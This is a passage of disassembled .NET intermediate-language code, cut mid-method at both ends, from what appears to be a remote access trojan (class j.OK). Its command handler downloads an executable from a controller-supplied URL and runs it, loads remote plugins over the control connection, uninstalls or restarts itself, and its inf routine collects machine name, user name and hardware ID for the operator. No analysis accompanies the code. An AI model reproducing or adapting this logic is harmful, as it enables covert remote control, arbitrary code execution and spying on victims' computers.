      IL_0c10:  ldloc.s    V_32
      IL_0c12:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0c17:  call       bool j.OK::Sendb(uint8[])
      IL_0c1c:  pop
      IL_0c1d:  ldloc.s    V_32
      IL_0c1f:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0c24:  ldloc.s    V_33
      IL_0c26:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0c2b:  ldloc.s    V_28
      IL_0c2d:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_0c32:  ldloc.s    V_31
      IL_0c34:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_0c39:  leave      IL_109e

      IL_0c3e:  ldloc.0
      IL_0c3f:  ldc.i4.1
      IL_0c40:  ldelem.ref
      IL_0c41:  stloc.s    V_26
      IL_0c43:  ldloc.s    V_26
      IL_0c45:  ldstr      "~"
      IL_0c4a:  ldc.i4.0
      IL_0c4b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0c50:  brfalse.s  IL_0c72

      IL_0c52:  ldloc.s    V_26
      IL_0c54:  ldstr      "!"
      IL_0c59:  ldc.i4.0
      IL_0c5a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0c5f:  brfalse.s  IL_0c79

      IL_0c61:  ldloc.s    V_26
      IL_0c63:  ldstr      "@"
      IL_0c68:  ldc.i4.0
      IL_0c69:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0c6e:  brfalse.s  IL_0c86

      IL_0c70:  br.s       IL_0ca1

      IL_0c72:  call       void j.OK::UNS()
      IL_0c77:  br.s       IL_0ca1

      IL_0c79:  ldc.i4.0
      IL_0c7a:  call       void j.OK::pr(int32)
      IL_0c7f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0c84:  br.s       IL_0ca1

      IL_0c86:  ldc.i4.0
      IL_0c87:  call       void j.OK::pr(int32)
      IL_0c8c:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0c91:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0c96:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0c9b:  pop
      IL_0c9c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0ca1:  leave      IL_109e

      IL_0ca6:  ldloc.2
      IL_0ca7:  ldstr      "up"
      IL_0cac:  ldc.i4.0
      IL_0cad:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0cb2:  brtrue     IL_0e4c

      IL_0cb7:  ldnull
      IL_0cb8:  stloc.s    V_5
      IL_0cba:  ldloc.0
      IL_0cbb:  ldc.i4.1
      IL_0cbc:  ldelem.ref
      IL_0cbd:  ldc.i4.0
      IL_0cbe:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_0cc3:  ldc.i4.s   31
      IL_0cc5:  bne.un.s   IL_0d43

      .try
      {
        IL_0cc7:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0ccc:  ldloc.0
        IL_0ccd:  ldc.i4.0
        IL_0cce:  ldelem.ref
        IL_0ccf:  ldsfld     string j.OK::Y
        IL_0cd4:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0cd9:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0cde:  stloc.s    V_37
        IL_0ce0:  dup
        IL_0ce1:  ldarg.0
        IL_0ce2:  ldloc.s    V_37
        IL_0ce4:  ldarg.0
        IL_0ce5:  ldlen
        IL_0ce6:  conv.i4
        IL_0ce7:  ldloc.s    V_37
        IL_0ce9:  sub.ovf
        IL_0cea:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0cef:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0cf4:  call       uint8[] j.OK::ZIP(uint8[])
        IL_0cf9:  stloc.s    V_5
        IL_0cfb:  leave      IL_0d9b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0d00:  dup
        IL_0d01:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0d06:  stloc.s    V_38
        IL_0d08:  ldloc.s    V_38
        IL_0d0a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0d0f:  ldstr      "MSG"
        IL_0d14:  ldsfld     string j.OK::Y
        IL_0d19:  ldstr      "Update ERROR"
        IL_0d1e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0d23:  call       bool j.OK::Send(string)
        IL_0d28:  pop
        IL_0d29:  ldstr      "bla"
        IL_0d2e:  call       bool j.OK::Send(string)
        IL_0d33:  pop
        IL_0d34:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0d39:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0d3e:  leave      IL_109e

      }  // end handler
      IL_0d43:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_0d48:  stloc.s    V_6
      .try
      {
        IL_0d4a:  ldloc.s    V_6
        IL_0d4c:  ldloc.0
        IL_0d4d:  ldc.i4.1
        IL_0d4e:  ldelem.ref
        IL_0d4f:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_0d54:  stloc.s    V_5
        IL_0d56:  leave.s    IL_0d9b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0d58:  dup
        IL_0d59:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0d5e:  stloc.s    V_39
        IL_0d60:  ldloc.s    V_39
        IL_0d62:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0d67:  ldstr      "MSG"
        IL_0d6c:  ldsfld     string j.OK::Y
        IL_0d71:  ldstr      "Update ERROR"
        IL_0d76:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0d7b:  call       bool j.OK::Send(string)
        IL_0d80:  pop
        IL_0d81:  ldstr      "bla"
        IL_0d86:  call       bool j.OK::Send(string)
        IL_0d8b:  pop
        IL_0d8c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0d91:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0d96:  leave      IL_109e

      }  // end handler
      IL_0d9b:  ldstr      "bla"
      IL_0da0:  call       bool j.OK::Send(string)
      IL_0da5:  pop
      IL_0da6:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_0dab:  ldstr      ".exe"
      IL_0db0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0db5:  stloc.s    V_7
      .try
      {
        IL_0db7:  ldstr      "MSG"
        IL_0dbc:  ldsfld     string j.OK::Y
        IL_0dc1:  ldstr      "Updating To "
        IL_0dc6:  ldloc.s    V_7
        IL_0dc8:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_0dcd:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_0dd2:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0dd7:  call       bool j.OK::Send(string)
        IL_0ddc:  pop
        IL_0ddd:  ldc.i4     0x7d0
        IL_0de2:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_0de7:  ldloc.s    V_7
        IL_0de9:  ldloc.s    V_5
        IL_0deb:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_0df0:  ldloc.s    V_7
        IL_0df2:  ldstr      ".."
        IL_0df7:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                                string)
        IL_0dfc:  pop
        IL_0dfd:  leave.s    IL_0e42

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0dff:  dup
        IL_0e00:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0e05:  stloc.s    V_40
        IL_0e07:  ldloc.s    V_40
        IL_0e09:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0e0e:  ldloc.s    V_40
        IL_0e10:  stloc.s    V_41
        IL_0e12:  ldstr      "MSG"
        IL_0e17:  ldsfld     string j.OK::Y
        IL_0e1c:  ldstr      "Update ERROR "
        IL_0e21:  ldloc.s    V_41
        IL_0e23:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0e28:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0e2d:  call       bool j.OK::Send(string)
        IL_0e32:  pop
        IL_0e33:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0e38:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0e3d:  leave      IL_109e

      }  // end handler
      IL_0e42:  call       void j.OK::UNS()
      IL_0e47:  leave      IL_109e

      IL_0e4c:  ldloc.2
      IL_0e4d:  ldstr      "Ex"
      IL_0e52:  ldc.i4.0
      IL_0e53:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0e58:  brtrue     IL_0f1d

      IL_0e5d:  ldsfld     object j.OK::PLG
      IL_0e62:  brtrue.s   IL_0eb6

      IL_0e64:  ldstr      "PLG"
      IL_0e69:  call       bool j.OK::Send(string)
      IL_0e6e:  pop
      IL_0e6f:  ldc.i4.0
      IL_0e70:  stloc.s    V_44
      IL_0e72:  br.s       IL_0e84

      IL_0e74:  ldloc.s    V_44
      IL_0e76:  ldc.i4.1
      IL_0e77:  add.ovf
      IL_0e78:  stloc.s    V_44
      IL_0e7a:  ldc.i4     0x3e8
      IL_0e7f:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0e84:  ldsfld     object j.OK::PLG
      IL_0e89:  ldnull
      IL_0e8a:  cgt.un
      IL_0e8c:  ldloc.s    V_44
      IL_0e8e:  ldc.i4.s   20
      IL_0e90:  ceq
      IL_0e92:  or
      IL_0e93:  ldsfld     bool j.OK::Cn
      IL_0e98:  ldc.i4.0
      IL_0e99:  ceq
      IL_0e9b:  or
      IL_0e9c:  brfalse.s  IL_0e74

      IL_0e9e:  ldsfld     object j.OK::PLG
      IL_0ea3:  ldnull
      IL_0ea4:  ceq
      IL_0ea6:  ldsfld     bool j.OK::Cn
      IL_0eab:  ldc.i4.0
      IL_0eac:  ceq
      IL_0eae:  or
      IL_0eaf:  brfalse.s  IL_0eb6

      IL_0eb1:  leave      IL_109e

      IL_0eb6:  ldc.i4.1
      IL_0eb7:  newarr     [mscorlib]System.Object
      IL_0ebc:  dup
      IL_0ebd:  ldc.i4.0
      IL_0ebe:  ldarg.0
      IL_0ebf:  stelem.ref
      IL_0ec0:  stloc.s    V_42
      IL_0ec2:  ldc.i4.1
      IL_0ec3:  newarr     [mscorlib]System.Boolean
      IL_0ec8:  dup
      IL_0ec9:  ldc.i4.0
      IL_0eca:  ldc.i4.1
      IL_0ecb:  stelem.i1
      IL_0ecc:  stloc.s    V_43
      IL_0ece:  ldsfld     object j.OK::PLG
      IL_0ed3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0ed8:  ldnull
      IL_0ed9:  ldstr      "ind"
      IL_0ede:  ldloc.s    V_42
      IL_0ee0:  ldnull
      IL_0ee1:  ldnull
      IL_0ee2:  ldloc.s    V_43
      IL_0ee4:  ldc.i4.1
      IL_0ee5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0eea:  pop
      IL_0eeb:  ldloc.s    V_43
      IL_0eed:  ldc.i4.0
      IL_0eee:  ldelem.u1
      IL_0eef:  brfalse    IL_0ff2

      IL_0ef4:  ldloc.s    V_42
      IL_0ef6:  ldc.i4.0
      IL_0ef7:  ldelem.ref
      IL_0ef8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0efd:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0f02:  ldtoken    uint8[]
      IL_0f07:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0f0c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_0f11:  castclass  uint8[]
      IL_0f16:  starg.s    b
      IL_0f18:  br         IL_0ff2

      IL_0f1d:  ldloc.2
      IL_0f1e:  ldstr      "PLG"
      IL_0f23:  ldc.i4.0
      IL_0f24:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0f29:  brtrue     IL_0ff2

      IL_0f2e:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0f33:  ldloc.0
      IL_0f34:  ldc.i4.0
      IL_0f35:  ldelem.ref
      IL_0f36:  ldsfld     string j.OK::Y
      IL_0f3b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0f40:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0f45:  stloc.s    V_45
      IL_0f47:  dup
      IL_0f48:  ldarg.0
      IL_0f49:  ldloc.s    V_45
      IL_0f4b:  ldarg.0
      IL_0f4c:  ldlen
      IL_0f4d:  conv.i4
      IL_0f4e:  ldloc.s    V_45
      IL_0f50:  sub.ovf
      IL_0f51:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0f56:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0f5b:  call       uint8[] j.OK::ZIP(uint8[])
      IL_0f60:  ldstr      "A"
      IL_0f65:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_0f6a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0f6f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0f74:  stsfld     object j.OK::PLG
      IL_0f79:  ldsfld     object j.OK::PLG
      IL_0f7e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0f83:  ldnull
      IL_0f84:  ldstr      "H"
      IL_0f89:  ldc.i4.1
      IL_0f8a:  newarr     [mscorlib]System.Object
      IL_0f8f:  dup
      IL_0f90:  ldc.i4.0
      IL_0f91:  ldsfld     string j.OK::H
      IL_0f96:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::StrReverse(string)
      IL_0f9b:  stelem.ref
      IL_0f9c:  ldnull
      IL_0f9d:  ldnull
      IL_0f9e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0fa3:  ldsfld     object j.OK::PLG
      IL_0fa8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0fad:  ldnull
      IL_0fae:  ldstr      "P"
      IL_0fb3:  ldc.i4.1
      IL_0fb4:  newarr     [mscorlib]System.Object
      IL_0fb9:  dup
      IL_0fba:  ldc.i4.0
      IL_0fbb:  ldsfld     string j.OK::P
      IL_0fc0:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::StrReverse(string)
      IL_0fc5:  stelem.ref
      IL_0fc6:  ldnull
      IL_0fc7:  ldnull
      IL_0fc8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0fcd:  ldsfld     object j.OK::PLG
      IL_0fd2:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0fd7:  ldnull
      IL_0fd8:  ldstr      "c"
      IL_0fdd:  ldc.i4.1
      IL_0fde:  newarr     [mscorlib]System.Object
      IL_0fe3:  dup
      IL_0fe4:  ldc.i4.0
      IL_0fe5:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0fea:  stelem.ref
      IL_0feb:  ldnull
      IL_0fec:  ldnull
      IL_0fed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0ff2:  leave      IL_109e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0ff7:  dup
      IL_0ff8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0ffd:  stloc.s    V_46
      IL_0fff:  ldloc.s    V_46
      IL_1001:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_1006:  ldloc.s    V_46
      IL_1008:  stloc.s    V_47
      IL_100a:  ldloc.0
      IL_100b:  ldlen
      IL_100c:  conv.i4
      IL_100d:  ldc.i4.0
      IL_100e:  ble.s      IL_103b

      IL_1010:  ldloc.0
      IL_1011:  ldc.i4.0
      IL_1012:  ldelem.ref
      IL_1013:  ldstr      "Ex"
      IL_1018:  ldc.i4.0
      IL_1019:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_101e:  ldc.i4.0
      IL_101f:  ceq
      IL_1021:  ldloc.0
      IL_1022:  ldc.i4.0
      IL_1023:  ldelem.ref
      IL_1024:  ldstr      "PLG"
      IL_1029:  ldc.i4.0
      IL_102a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_102f:  ldc.i4.0
      IL_1030:  ceq
      IL_1032:  or
      IL_1033:  brfalse.s  IL_103b

      IL_1035:  ldnull
      IL_1036:  stsfld     object j.OK::PLG
      IL_103b:  nop
      .try
      {
        IL_103c:  ldc.i4.5
        IL_103d:  newarr     [mscorlib]System.String
        IL_1042:  dup
        IL_1043:  ldc.i4.0
        IL_1044:  ldstr      "ER"
        IL_1049:  stelem.ref
        IL_104a:  dup
        IL_104b:  ldc.i4.1
        IL_104c:  ldsfld     string j.OK::Y
        IL_1051:  stelem.ref
        IL_1052:  dup
        IL_1053:  ldc.i4.2
        IL_1054:  ldloc.0
        IL_1055:  ldc.i4.0
        IL_1056:  ldelem.ref
        IL_1057:  stelem.ref
        IL_1058:  dup
        IL_1059:  ldc.i4.3
        IL_105a:  ldsfld     string j.OK::Y
        IL_105f:  stelem.ref
        IL_1060:  dup
        IL_1061:  ldc.i4.4
        IL_1062:  ldloc.s    V_47
        IL_1064:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_1069:  stelem.ref
        IL_106a:  call       string [mscorlib]System.String::Concat(string[])
        IL_106f:  call       bool j.OK::Send(string)
        IL_1074:  pop
        IL_1075:  leave.s    IL_1092

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1077:  dup
        IL_1078:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_107d:  stloc.s    V_48
        IL_107f:  ldloc.s    V_48
        IL_1081:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1086:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_108b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1090:  leave.s    IL_1092

      }  // end handler
      IL_1092:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_1097:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_109c:  leave.s    IL_109e

    }  // end handler
    IL_109e:  ret
  } // end of method OK::Ind

  .method public static string  inf() cil managed
  {
    // Code size       1056 (0x420)
    .maxstack  4
    .locals init (string V_0,
             string V_1,
             string V_2,
             string V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             valuetype [mscorlib]System.DateTime V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             string[] V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             string V_13,
             string[] V_14,
             int32 V_15,
             class [mscorlib]System.Exception V_16)
    IL_0000:  ldstr      "ll"
    IL_0005:  ldsfld     string j.OK::Y
    IL_000a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_000f:  stloc.0
    .try
    {
      IL_0010:  ldstr      "vn"
      IL_0015:  ldstr      ""
      IL_001a:  call       object j.OK::GTV(string,
                                            object)
      IL_001f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0024:  ldstr      ""
      IL_0029:  ldc.i4.0
      IL_002a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_002f:  brfalse.s  IL_0060

      IL_0031:  ldloc.0
      IL_0032:  ldsflda    string j.OK::VN
      IL_0037:  call       string j.OK::DEB(string&)
      IL_003c:  ldstr      "_"
      IL_0041:  call       string j.OK::HWD()
      IL_0046:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_004b:  stloc.2
      IL_004c:  ldloca.s   V_2
      IL_004e:  call       string j.OK::ENB(string&)
      IL_0053:  ldsfld     string j.OK::Y
      IL_0058:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_005d:  stloc.0
      IL_005e:  br.s       IL_00a4

      IL_0060:  ldloc.0
      IL_0061:  ldstr      "vn"
      IL_0066:  ldstr      ""
      IL_006b:  call       object j.OK::GTV(string,
                                            object)
      IL_0070:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0075:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_007a:  stloc.3
      IL_007b:  ldloca.s   V_3
      IL_007d:  call       string j.OK::DEB(string&)
      IL_0082:  ldstr      "_"
      IL_0087:  call       string j.OK::HWD()
      IL_008c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0091:  stloc.2
      IL_0092:  ldloca.s   V_2
      IL_0094:  call       string j.OK::ENB(string&)
      IL_0099:  ldsfld     string j.OK::Y
      IL_009e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00a3:  stloc.0
      IL_00a4:  leave.s    IL_00da

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00a6:  dup
      IL_00a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00ac:  stloc.s    V_4
      IL_00ae:  ldloc.s    V_4
      IL_00b0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b5:  ldloc.0
      IL_00b6:  call       string j.OK::HWD()
      IL_00bb:  stloc.2
      IL_00bc:  ldloca.s   V_2
      IL_00be:  call       string j.OK::ENB(string&)
      IL_00c3:  ldsfld     string j.OK::Y
      IL_00c8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00cd:  stloc.0
      IL_00ce:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d8:  leave.s    IL_00da

    }  // end handler
    IL_00da:  nop
    .try
    {
      IL_00db:  ldloc.0
      IL_00dc:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_00e1:  ldsfld     string j.OK::Y
      IL_00e6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00eb:  stloc.0
      IL_00ec:  leave.s    IL_011a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00ee:  dup
      IL_00ef:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00f4:  stloc.s    V_5
      IL_00f6:  ldloc.s    V_5
      IL_00f8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00fd:  ldloc.0
      IL_00fe:  ldstr      "\?\?"
      IL_0103:  ldsfld     string j.OK::Y
      IL_0108:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_010d:  stloc.0
      IL_010e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0113:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0118:  leave.s    IL_011a

    }  // end handler
    IL_011a:  nop
    .try
    {
      IL_011b:  ldloc.0
      IL_011c:  call       string [mscorlib]System.Environment::get_UserName()
      IL_0121:  ldsfld     string j.OK::Y
      IL_0126:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_012b:  stloc.0
      IL_012c:  leave.s    IL_015a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_012e:  dup
      IL_012f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0134:  stloc.s    V_6
      IL_0136:  ldloc.s    V_6
      IL_0138:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_013d:  ldloc.0
      IL_013e:  ldstr      "\?\?"
      IL_0143:  ldsfld     string j.OK::Y
      IL_0148:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_014d:  stloc.0
      IL_014e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0153:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0158:  leave.s    IL_015a

    }  // end handler
    IL_015a:  nop
    .try
    {
      IL_015b:  ldloc.0
      IL_015c:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0161:  callvirt   instance valuetype [mscorlib]System.DateTime [mscorlib]System.IO.FileSystemInfo::get_LastWriteTime()
      IL_0166:  stloc.s    V_7
      IL_0168:  ldloca.s   V_7
      IL_016a:  call       instance valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Date()
      IL_016f:  stloc.s    V_7
      IL_0171:  ldloca.s   V_7
      IL_0173:  ldstr      "yy-MM-dd"
      IL_0178:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_017d:  ldsfld     string j.OK::Y
      IL_0182:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0187:  stloc.0
      IL_0188:  leave.s    IL_01b6

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_018a:  dup
      IL_018b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0190:  stloc.s    V_8
      IL_0192:  ldloc.s    V_8
